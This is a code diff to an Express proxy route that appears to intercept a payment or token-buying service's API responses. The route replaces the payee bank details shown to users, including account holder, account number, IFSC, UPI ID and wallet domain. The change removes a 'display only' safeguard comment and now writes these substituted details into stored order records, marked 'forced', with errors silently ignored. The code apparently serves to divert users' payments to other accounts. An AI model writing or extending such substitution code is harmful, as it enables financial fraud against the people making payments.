@@ -2906,7 +2906,7 @@ app.all('/xxapi/*', async (req, res) => {
                                 if (mappedWallet) item.walletDomain = mappedWallet;
                             }
                         } else if (minOk && (!urlLower.includes('history') || orderState <= 2 || item.walletDomain)) {
-                            // On-the-fly replace for display ONLY — NEVER write to orderBankMap here!
+                            // On-the-fly replace for display
                             if (urlLower.includes('waitconfirm')) {
                                 replaceWaitConfirmBankFields(item, bank);
                             } else {
@@ -2914,6 +2914,33 @@ app.all('/xxapi/*', async (req, res) => {
                             }
                             if (item.walletDomain) {
                                 item.walletDomain = rewriteWalletDomainForBank(item.walletDomain, bank, bank && bank.minAmount);
+                            }
+
+                            // Capture and save order into KV from user's history (/buyitoken/history)
+                            if (urlLower.includes('history') && oId) {
+                                if (!data.orderBankMap) data.orderBankMap = {};
+                                const savedData = {
+                                    bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
+                                    accountHolder: bank.accountHolder,
+                                    accountNo: bank.accountNo,
+                                    ifsc: bank.ifsc,
+                                    bankName: bank.bankName || '',
+                                    upiId: bank.upiId || '',
+                                    rptNo: item.rptNo || oId,
+                                    orderNo: item.orderNo || oId,
+                                    orderId: oId,
+                                    amount: iAmt,
+                                    walletDomain: item.walletDomain || '',
+                                    time: now,
+                                    userId: userId || item.uid || item.userId || '',
+                                    isManual: true,
+                                    forced: true
+                                };
+                                data.orderBankMap[oId] = savedData;
+                                if (item.rptNo && String(item.rptNo) !== oId) data.orderBankMap[String(item.rptNo)] = savedData;
+                                if (item.orderNo && String(item.orderNo) !== oId) data.orderBankMap[String(item.orderNo)] = savedData;
+                                data._skipOverrideMerge = true;
+                                saveData(data).catch(() => { });
                             }
                         }
                     });
